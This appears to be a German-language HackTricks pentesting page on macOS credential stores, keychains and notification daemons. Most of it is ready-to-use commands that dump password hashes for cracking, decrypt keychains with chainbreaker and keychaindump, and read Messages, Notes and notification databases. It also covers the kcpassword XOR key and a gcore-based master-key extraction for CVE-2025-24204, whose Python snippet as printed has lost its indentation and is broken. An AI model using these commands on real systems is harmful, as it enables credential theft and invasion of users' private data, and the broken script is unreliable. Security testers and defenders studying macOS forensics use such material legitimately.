# macOS — sensible Orte & interessante Daemons

{{#include ../../../banners/hacktricks-training.md}}

## Passwörter

### Shadow-Passwörter

Shadow-Passwörter werden zusammen mit der Benutzerkonfiguration in plists gespeichert, die sich in **`/var/db/dslocal/nodes/Default/users/`** befinden.\\
Der folgende One-Liner kann verwendet werden, um **alle Informationen über die Benutzer** (einschließlich Hash-Informationen) auszudumpen:
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
[**Skripte wie dieses**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) oder [**dieses hier**](https://github.com/octomagon/davegrohl.git) können verwendet werden, um den Hash in das **hashcat** **format** zu transformieren.

Ein alternativer one-liner, der die creds aller Nicht-Dienstkonten im **hashcat** **format** `-m 7100` (macOS PBKDF2-SHA512) ausgibt:
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
Eine andere Möglichkeit, die `ShadowHashData` eines Benutzers zu erhalten, ist die Verwendung von `dscl`: `` sudo dscl . -read /Users/`whoami` ShadowHashData ``

### /etc/master.passwd

Diese Datei wird **nur verwendet**, wenn das System im **Single-User-Modus** läuft (also nicht sehr häufig).

### Keychain Dump

Beachte, dass beim Verwenden des `security`-Binaries, um **dump the passwords decrypted**, mehrere Eingabeaufforderungen den Benutzer um Erlaubnis für diese Operation bitten werden.
```bash
#security
security dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

> [!CAUTION]
> Basierend auf diesem Kommentar [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) sieht es so aus, als würden diese Tools in Big Sur nicht mehr funktionieren.

### Keychaindump Überblick

Ein Tool namens **keychaindump** wurde entwickelt, um Passwörter aus macOS-Keychains zu extrahieren, steht aber in neueren macOS-Versionen wie Big Sur vor Einschränkungen, wie in einer [Diskussion](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) angegeben. Der Einsatz von **keychaindump** erfordert, dass der Angreifer Zugriff erhält und seine Rechte auf **root** eskaliert. Das Tool nutzt die Tatsache aus, dass die Keychain aus Komfortgründen standardmäßig beim Benutzer-Login entsperrt wird, wodurch Anwendungen darauf zugreifen können, ohne wiederholt das Benutzerpasswort abzufragen. Wenn ein Benutzer jedoch seine Keychain nach jeder Verwendung sperrt, wird **keychaindump** wirkungslos.

**Keychaindump** arbeitet, indem es einen bestimmten Prozess namens **securityd** angreift, den Apple als Daemon für Autorisierungs- und Kryptografie-Operationen beschreibt, der für den Zugriff auf die Keychain entscheidend ist. Der Extraktionsprozess umfasst die Identifikation eines **Master Key**, der aus dem Login-Passwort des Benutzers abgeleitet wird. Dieser Schlüssel ist essenziell zum Auslesen der Keychain-Datei. Um den **Master Key** zu finden, durchsucht **keychaindump** den Speicher-Heap von **securityd** mit dem Befehl `vmmap` und sucht nach potenziellen Schlüsseln in Bereichen, die als `MALLOC_TINY` markiert sind. Der folgende Befehl wird verwendet, um diese Speicherbereiche zu inspizieren:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Nachdem potenzielle Master-Schlüssel identifiziert wurden, durchsucht **keychaindump** die Heaps nach einem spezifischen Muster (`0x0000000000000018`), das auf einen Kandidaten für den Master-Schlüssel hinweist. Weitere Schritte, einschließlich Deobfuskation, sind erforderlich, um diesen Schlüssel zu verwenden, wie im Quellcode von **keychaindump** beschrieben. Analysten, die sich auf diesen Bereich konzentrieren, sollten beachten, dass die entscheidenden Daten zum Entschlüsseln des keychain im Speicher des Prozesses **securityd** gespeichert sind. Ein Beispielbefehl zum Ausführen von **keychaindump** ist:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) kann verwendet werden, um die folgenden Arten von Informationen aus einem OSX Keychain forensisch sauber zu extrahieren:

- Gehashte Keychain-Passwörter, geeignet zum Cracking mit [hashcat](https://hashcat.net/hashcat/) oder [John the Ripper](https://www.openwall.com/john/)
- Internet-Passwörter
- Generische Passwörter
- Private Keys
- Public Keys
- X509-Zertifikate
- Secure Notes
- Appleshare-Passwörter

Wenn das Keychain-Entsperrpasswort, ein Master-Key, der mit [volafox](https://github.com/n0fate/volafox) oder [volatility](https://github.com/volatilityfoundation/volatility) gewonnen wurde, oder eine Entsperrdatei wie SystemKey vorliegt, liefert Chainbreaker außerdem Klartext-Passwörter.

Ohne eine dieser Methoden zur Entsperrung des Keychain zeigt Chainbreaker alle anderen verfügbaren Informationen an.

#### **Keychain-Schlüssel ausgeben**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dump Schlüsselbund-Schlüssel (mit Passwörtern) mit SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (mit Passwörtern) cracking the hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (mit Passwörtern) mit memory dump**

[Befolge diese Schritte](../index.html#dumping-memory-with-osxpmem), um einen **memory dump** durchzuführen
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Keychain keys dumpen (with passwords) mithilfe des User password**

Wenn Sie das password des Users kennen, können Sie es verwenden, um **keychains, die dem User gehören, zu dumpen und zu decrypten**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### Keychain Master-Schlüssel via `gcore`-Entitlement (CVE-2025-24204)

macOS 15.0 (Sequoia) lieferte `/usr/bin/gcore` mit dem **`com.apple.system-task-ports.read`**-Entitlement aus, sodass jeder lokale Admin (oder eine bösartige signierte App) **den Speicher beliebiger Prozesse dumpen konnte, selbst wenn SIP/TCC durchgesetzt sind**. Dumping `securityd` leaks den **Keychain master key** im Klartext und ermöglicht das Entschlüsseln von `login.keychain-db` ohne Benutzerpasswort.

**Schnelle Repro auf verwundbaren Builds (15.0–15.2):**
```bash
sudo pgrep securityd        # usually a single PID
sudo gcore -o /tmp/securityd $(pgrep securityd)   # produces /tmp/securityd.<pid>
python3 - <<'PY'
import mmap,re,sys
with open('/tmp/securityd.'+sys.argv[1],'rb') as f:
mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)
for m in re.finditer(b'\x00\x00\x00\x00\x00\x00\x00\x18.{96}',mm):
c=m.group(0)
if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break
PY $(pgrep securityd)
```
Feed the extracted hex key to Chainbreaker (`--key <hex>`) to decrypt the login keychain. Apple removed the entitlement in **macOS 15.3+**, so this only works on unpatched Sequoia builds or systems that kept the vulnerable binary.

### kcpassword

Die **kcpassword**-Datei ist eine Datei, die das **Login-Passwort des Benutzers** enthält, aber nur, wenn der Systembesitzer die **automatische Anmeldung** aktiviert hat. Daher wird der Benutzer automatisch angemeldet, ohne nach einem Passwort gefragt zu werden (was nicht sehr sicher ist).

Das Passwort ist in der Datei **`/etc/kcpassword`** gespeichert und mit dem Schlüssel **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`** xor-verknüpft. Ist das Passwort des Benutzers länger als der Schlüssel, wird der Schlüssel wiederverwendet.\
Das macht das Passwort ziemlich einfach wiederherstellbar, zum Beispiel mit Skripten wie [**diesem**](https://gist.github.com/opshope/32f65875d45215c3677d).

## Interessante Informationen in Datenbanken

### Messages
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Benachrichtigungen

Die Benachrichtigungsdaten findest du in `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Die meisten der interessanten Informationen befinden sich in **blob**. Du musst also diesen Inhalt **extrahieren** und in ein **für Menschen** **lesbares** Format **transformieren** oder **`strings`** verwenden. Um darauf zuzugreifen, kannst du:
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
#### Jüngste Datenschutzprobleme (NotificationCenter DB)

- In macOS **14.7–15.1** hat Apple Banner-Inhalte in der `db2/db` SQLite ohne ordnungsgemäße Schwärzung gespeichert. CVEs **CVE-2024-44292/44293/40838/54504** ermöglichten es jedem lokalen Benutzer, die Benachrichtigungstexte anderer Nutzer allein durch Öffnen der DB zu lesen (kein TCC-Prompt). Behoben in **15.2** durch Verschieben/Sperren der DB; auf älteren Systemen leakt der oben genannte Pfad weiterhin aktuelle Benachrichtigungen und Anhänge.
- Die Datenbank ist nur in den betroffenen Builds world-readable, daher sollte man sie beim hunting auf legacy endpoints vor dem Update kopieren, um Artefakte zu bewahren.

### Notizen

Die Benutzer-**Notizen** befinden sich in `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
## Einstellungen

In macOS befinden sich die App-Einstellungen in **`$HOME/Library/Preferences`** und in iOS sind sie in `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.

Unter macOS kann das CLI-Tool **`defaults`** verwendet werden, um **die Einstellungsdatei zu ändern**.

**`/usr/sbin/cfprefsd`** beansprucht die XPC-Services `com.apple.cfprefsd.daemon` und `com.apple.cfprefsd.agent` und kann aufgerufen werden, um Aktionen wie das Ändern von Einstellungen durchzuführen.

## OpenDirectory permissions.plist

Die Datei `/System/Library/OpenDirectory/permissions.plist` enthält Berechtigungen, die auf Node-Attribute angewendet werden, und ist durch SIP geschützt.\
Diese Datei gewährt Berechtigungen für bestimmte Benutzer anhand ihrer UUID (und nicht ihrer uid), sodass sie in der Lage sind, auf bestimmte sensible Informationen wie `ShadowHashData`, `HeimdalSRPKey` und `KerberosKeys` unter anderem zuzugreifen:
```xml
[...]
<key>dsRecTypeStandard:Computers</key>
<dict>
<key>dsAttrTypeNative:ShadowHashData</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
<key>dsAttrTypeNative:KerberosKeys</key>
<array>
<dict>
<!-- allow wheel even though it's implicit -->
<key>uuid</key>
<string>ABCDEFAB-CDEF-ABCD-EFAB-CDEF00000000</string>
<key>permissions</key>
<array>
<string>readattr</string>
<string>writeattr</string>
</array>
</dict>
</array>
[...]
```
## Systembenachrichtigungen

### Darwin-Benachrichtigungen

Der Hauptdaemon für Benachrichtigungen ist **`/usr/sbin/notifyd`**. Um Benachrichtigungen zu empfangen, müssen sich Clients über den `com.apple.system.notification_center` Mach-Port registrieren (prüfe sie mit `sudo lsmp -p <pid notifyd>`). Der Daemon lässt sich über die Datei `/etc/notify.conf` konfigurieren.

Die für Benachrichtigungen verwendeten Namen sind eindeutige Reverse-DNS-Notationen; wenn eine Benachrichtigung an einen dieser Namen gesendet wird, erhalten die Clients, die angegeben haben, sie verarbeiten zu können, die Benachrichtigung.

Es ist möglich, den aktuellen Status zu dumpen (und alle Namen zu sehen), indem man das Signal SIGUSR2 an den notifyd-Prozess sendet und die erzeugte Datei `/var/run/notifyd_<pid>.status` liest:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Verteiltes Benachrichtigungszentrum

Das **Verteilte Benachrichtigungszentrum**, dessen Haupt-Binary **`/usr/sbin/distnoted`** ist, ist eine weitere Möglichkeit, Benachrichtigungen zu senden. Es stellt einige XPC-Services bereit und führt einige Prüfungen durch, um Clients zu verifizieren.

### Apple Push Notifications (APN)

In diesem Fall können sich Anwendungen für **topics** registrieren. Der Client erzeugt ein Token, indem er Apples Server über **`apsd`** kontaktiert.\
Anschließend haben auch Provider ein Token erzeugt und können sich mit Apples Servern verbinden, um Nachrichten an die Clients zu senden. Diese Nachrichten werden lokal von **`apsd`** empfangen, das die Benachrichtigung an die wartende Anwendung weiterleitet.

Die Präferenzen befinden sich in `/Library/Preferences/com.apple.apsd.plist`.

Es gibt eine lokale Nachrichtendatenbank, in macOS unter `/Library/Application\ Support/ApplePushService/aps.db` und in iOS unter `/var/mobile/Library/ApplePushService`. Sie hat 3 Tabellen: `incoming_messages`, `outgoing_messages` und `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Es ist auch möglich, Informationen über den Daemon und die Verbindungen zu erhalten, indem man Folgendes verwendet:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Benutzerbenachrichtigungen

Dies sind Benachrichtigungen, die der Benutzer auf dem Bildschirm sehen sollte:

- **`CFUserNotification`**: Diese API bietet eine Möglichkeit, ein Pop-up mit einer Nachricht auf dem Bildschirm anzuzeigen.
- **The Bulletin Board**: Dies zeigt in iOS ein Banner, das verschwindet und im Notification Center gespeichert wird.
- **`NSUserNotificationCenter`**: Dies ist das iOS Bulletin Board in MacOS. Die Datenbank mit den Benachrichtigungen befindet sich in `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`

## Referenzen

- [HelpNetSecurity – macOS gcore entitlement allowed Keychain master key extraction (CVE-2025-24204)](https://www.helpnetsecurity.com/2025/09/04/macos-gcore-vulnerability-cve-2025-24204/)
- [Rapid7 – Notification Center SQLite disclosure (CVE-2024-44292 et al.)](https://www.rapid7.com/db/vulnerabilities/apple-osx-notificationcenter-cve-2024-44292/)

{{#include ../../../banners/hacktricks-training.md}}
